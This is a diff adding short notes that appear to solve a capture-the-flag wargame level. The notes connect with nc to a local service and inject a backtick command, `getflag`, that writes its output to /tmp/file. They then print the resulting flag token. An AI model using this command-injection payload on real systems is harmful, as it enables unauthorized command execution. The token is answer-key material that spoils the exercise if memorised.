@@ -1,0 +1,8 @@
+LEVEL11
+ls
+-> level11.lua
+cat level11
+nc 127.0.0.1 5151
+echo `getflag` > /tmp/file
+cat /tmp/file
+-> token: fa6v5ateaw21peobuub8ipe6s
